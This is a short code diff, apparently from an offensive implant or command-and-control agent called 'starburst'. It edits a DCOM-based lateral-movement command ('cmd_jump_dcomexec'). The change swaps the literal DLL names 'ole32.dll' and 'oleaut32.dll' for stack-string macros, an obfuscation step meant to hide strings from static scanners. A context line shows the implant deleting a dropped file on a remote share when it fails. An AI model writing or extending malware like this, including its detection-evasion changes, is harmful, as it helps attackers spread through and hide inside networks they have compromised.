@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <stackstr.h>
 
 #ifdef INCLUDE_CMD_JUMP_DCOMEXEC
 
@@ -106,10 +107,10 @@ auto declfn starburst::cmd_jump_dcomexec(
     }
 
     // resolve COM APIs
-    HMODULE h_ole32 = inst.kernel32.LoadLibraryA(
-        symbol<char*>( const_cast<char*>( "ole32.dll" ) ) );
-    HMODULE h_oleaut32 = inst.kernel32.LoadLibraryA(
-        symbol<char*>( const_cast<char*>( "oleaut32.dll" ) ) );
+    STK_OLE32(_n1);
+    STK_OLEAUT32(_n2);
+    HMODULE h_ole32 = inst.kernel32.LoadLibraryA( _n1 );
+    HMODULE h_oleaut32 = inst.kernel32.LoadLibraryA( _n2 );
 
     if ( !h_ole32 || !h_oleaut32 ) {
         inst.kernel32.DeleteFileW( w_unc );
